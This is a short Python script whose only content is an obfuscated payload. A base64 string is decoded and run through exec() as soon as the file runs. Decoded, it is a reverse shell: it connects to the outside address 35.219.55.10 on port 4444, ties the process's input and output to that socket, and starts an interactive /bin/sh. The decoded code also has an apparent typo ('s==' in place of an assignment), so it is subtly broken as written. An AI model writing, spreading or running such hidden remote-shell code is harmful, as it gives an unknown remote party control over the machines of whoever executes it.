import socket
import subprocess
import os
import base64

def allo():
    encoded_code = b"aW1wb3J0IHNvY2tldCwgb3MsIHN1YnByb2Nlc3M7\ncz09c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjM1LjIxOS41NS4xMCIsIDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksIDApO29zLmR1cDIocy5maWxlbm8oKSwgMSk7b3MuZHVwMihzLmZpbGVubygpLCAyKTtzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwgIi1pIl0p"  #  Base64 of the original code inside allo
    decoded_code = base64.b64decode(encoded_code)
    exec(decoded_code)

allo()